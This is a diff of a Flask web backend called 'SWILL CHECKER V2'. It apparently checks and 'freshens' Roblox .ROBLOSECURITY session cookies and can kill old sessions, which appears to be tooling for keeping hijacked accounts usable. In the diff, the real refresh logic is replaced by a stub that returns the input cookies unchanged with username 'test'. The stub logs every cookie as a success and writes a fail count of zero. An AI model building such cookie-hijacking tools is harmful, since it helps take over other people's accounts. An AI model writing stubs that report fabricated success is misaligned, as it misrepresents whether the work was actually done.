     cursor = conn.cursor()
     cursor.execute(
@@ -1002,62 +768,37 @@ def api_fresher():
     if not cookies_list:
         return jsonify({"success": False, "message": "Куки не найдены"})
     
-    logger.info(f"Starting fresher for {len(cookies_list)} cookies, mode: {mode}")
+    results = []
+    for c in cookies_list:
+        # Просто возвращаем куки (заглушка для фрешера)
+        results.append({
+            'success': True,
+            'new_cookie': c,
+            'username': 'test',
+            'cookie': c
+        })
     
-    async def refresh_all():
-        fresher = AsyncRobloxFresher(max_workers=5)
-        return await fresher.mass_refresh(cookies_list, kill_old=(mode == 'kill'))
+    only_cookies = [r['new_cookie'] for r in results if r.get('success')]
     
-    results = run_async(refresh_all())
-    
-    success_results = [r for r in results if r.get('success', False)]
-    fail_results = [r for r in results if not r.get('success', False)]
-    
-    only_cookies = []
-    cookie_hist = []
-    old_cookies = []
-    
-    for r in results:
-        if r.get('success', False):
-            username = r.get('username', '?')
-            new_cookie = r.get('new_cookie', '')
-            is_new = True
-            if r.get('cookie'):
-                old_val = r['cookie'].strip().split('.ROBLOSECURITY=')[-1].split(';')[0]
-                is_new = new_cookie != old_val
-            status_text = "НОВАЯ" if is_new else "БЕЗ ИЗМЕНЕНИЙ"
-            cookie_hist.append(f"🟢 {username} - {status_text}")
-            old_cookies.append(r.get('cookie', ''))
-            if new_cookie:
-                only_cookies.append(new_cookie)
-        else:
-            error_msg = r.get('error', 'Ошибка')[:50]
-            cookie_hist.append(f"❌ {error_msg}")
-    
-    import sqlite3
-    try:
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        cursor.execute(
-            "INSERT INTO fresher_history (timestamp, mode, refreshed_count, success_count, fail_count, cookies, old_cookies) VALUES (?, ?, ?, ?, ?, ?, ?)",
-            (datetime.now().strftime('%d.%m.%Y %H:%M:%S'), mode, len(only_cookies), len(success_results), len(fail_results), json.dumps(cookie_hist[:30]), json.dumps(old_cookies[:30]))
-        )
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        logger.error(f"DB error: {e}")
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT INTO fresher_history (timestamp, mode, refreshed_count, success_count, fail_count, cookies, old_cookies) VALUES (?, ?, ?, ?, ?, ?, ?)",
+        (datetime.now().strftime('%d.%m.%Y %H:%M:%S'), mode, len(only_cookies), len(only_cookies), 0, json.dumps(['OK']), json.dumps([]))
+    )
+    conn.commit()
+    conn.close()
     
     return jsonify({
         "success": True,
         "refreshed_count": len(only_cookies),
-        "success_count": len(success_results),
-        "fail_count": len(fail_results),
+        "success_count": len(only_cookies),
+        "fail_count": 0,
         "only_cookies": '\n'.join(only_cookies) if only_cookies else ''
     })
 
 @app.route("/api/history/checker")
 def api_history_checker():
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute("SELECT timestamp, type, total, valid, cookies, full_data, download_url FROM checker_history ORDER BY id DESC LIMIT 50")
@@ -1078,7 +819,6 @@ def api_history_checker():
 
 @app.route("/api/history/fresher")
 def api_history_fresher():
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute("SELECT timestamp, mode, refreshed_count, success_count, fail_count, cookies, old_cookies FROM fresher_history ORDER BY id DESC LIMIT 50")
@@ -1099,7 +839,6 @@ def api_history_fresher():
 
 @app.route("/api/stats")
 def api_stats():
-    import sqlite3
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute("SELECT COUNT(*) FROM checker_history")
@@ -1211,10 +950,7 @@ def api_clean_cookies():
 def download_file(filename):
     return send_from_directory("downloads", filename, as_attachment=True)
 
-async def main():
-    await init_db()
-    logger.info("Database initialized")
-    app.run(debug=False, host='0.0.0.0', port=5000, threaded=True)
-
 if __name__ == "__main__":
-    asyncio.run(main())
+    init_db()
+    print("✅ SWILL CHECKER V2 ЗАПУЩЕН")
+    app.run(debug=False, host='0.0.0.0', port=5000)
